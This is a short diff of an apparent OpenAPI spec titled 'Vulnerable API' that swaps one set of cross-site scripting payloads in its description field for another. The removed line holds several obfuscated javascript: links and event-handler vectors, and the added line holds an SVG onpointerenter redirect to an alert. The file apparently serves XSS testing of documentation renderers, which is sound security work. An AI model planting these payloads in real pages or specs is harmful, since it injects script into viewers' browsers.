@@ -3,7 +3,7 @@
   "info": {
     "title": "Vulnerable API",
     "version": "1.0.0",
-    "description": "%3ca%2fhref%3d%22j%0A%0Davascript%3a%7bvar%7b3%3as,2%3ah,5%3aa,0%3av,4%3an,1%3ae%7d%3d'earltv'%7d[self][0][v%2ba%2be%2bs](e%2bs%2bv%2bh%2bn)(%2finfected%2f%2esource)%22%20%2f%3eclick<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(/ChromeCanary/)\" style=\"content-visibility:auto\"><svg><a><animate attributeName=href values=javas%26Tab;cript:alert(1) /><text x=20 y=20>Click me</text></a><iframe src=x><a/href=\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)\" />click + "
+    "description": "<sVg OnPointerEnter=\"location=javas+cript:ale+rt%2+81%2+9;//</div\">"
   },
   "servers": [
     {
